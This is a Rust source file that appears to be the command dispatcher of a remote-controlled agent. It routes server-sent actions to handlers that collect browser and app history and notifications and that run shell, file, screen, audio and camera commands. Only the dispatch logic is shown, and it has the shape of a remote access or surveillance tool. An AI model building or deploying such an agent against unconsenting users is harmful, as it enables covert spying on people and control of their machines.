use crate::agent::AgentState;
use crate::commands::{handle_command, CommandResponse, IncomingPacket};
use crate::file_commands::{handle_file_command, is_file_action};
use crate::screen_commands::{handle_screen_command, is_screen_action};
use crate::history_commands::HistoryCommand;
use crate::shell_commands::{handle_shell_command, is_shell_action};

pub fn is_history_action(action: &str) -> bool {
    matches!(
        action,
        "FETCH_BROWSER_HISTORY"
            | "FETCH_APP_HISTORY"
            | "FETCH_SYSTEM_NOTIFICATIONS"
            | "STOP_HISTORY_COLLECTION"
    )
}

pub fn is_agent_control_action(action: &str) -> bool {
    matches!(action, "RESTART_AGENT" | "RESTART_SERVICE")
}

pub fn handle_agent_control_command(action: &str) -> Option<CommandResponse> {
    match action {
        "RESTART_AGENT" | "RESTART_SERVICE" => {
            // Respond first, then restart shortly so the ACK can leave the socket.
            std::thread::spawn(|| {
                std::thread::sleep(std::time::Duration::from_secs(1));
                let _ = crate::service::restart_service();
                // If service restart is unavailable, exit so SCM / launcher respawns us.
                std::process::exit(0);
            });
            Some(CommandResponse {
                json: serde_json::json!({
                    "type": "sys_ack",
                    "status": "success",
                    "action": action,
                    "message": "Agent restart scheduled."
                }),
                frame: None,
                frame_kind: 0,
            })
        }
        _ => None,
    }
}

pub fn handle_history_command(action: &str) -> Option<CommandResponse> {
    let response = match action {
        "FETCH_BROWSER_HISTORY" => {
            let data = HistoryCommand::execute_fetch_browser_history();
            CommandResponse {
                json: data,
                frame: None,
                frame_kind: 0,
            }
        }
        "FETCH_APP_HISTORY" => {
            let data = HistoryCommand::execute_fetch_app_history();
            CommandResponse {
                json: data,
                frame: None,
                frame_kind: 0,
            }
        }
        "FETCH_SYSTEM_NOTIFICATIONS" => {
            let data = HistoryCommand::execute_fetch_notifications();
            CommandResponse {
                json: data,
                frame: None,
                frame_kind: 0,
            }
        }
        "STOP_HISTORY_COLLECTION" => {
            let data = HistoryCommand::execute_stop_collection();
            CommandResponse {
                json: data,
                frame: None,
                frame_kind: 0,
            }
        }
        _ => return None,
    };
    Some(response)
}

pub fn is_audio_action(action: &str) -> bool {
    matches!(action, "START_AUDIO_STREAM" | "STOP_AUDIO_STREAM")
}

pub fn dispatch_command(packet: IncomingPacket, agent: &mut AgentState) -> Option<CommandResponse> {
    if is_agent_control_action(&packet.action) {
        handle_agent_control_command(&packet.action)
    } else if is_history_action(&packet.action) {
        handle_history_command(&packet.action)
    } else if is_shell_action(&packet.action) {
        handle_shell_command(packet, &mut agent.shell)
    } else if is_file_action(&packet.action) {
        handle_file_command(packet, &mut agent.files)
    } else if is_screen_action(&packet.action) {
        handle_screen_command(packet, &mut agent.screen)
    } else if is_audio_action(&packet.action) {
        Some(CommandResponse {
            json: serde_json::json!({
                "type": "sys_ack",
                "status": "success",
                "message": format!("Audio command {} accepted", packet.action)
            }),
            frame: None,
            frame_kind: 0,
        })
    } else {
        handle_command(packet, &mut agent.camera)
    }
}
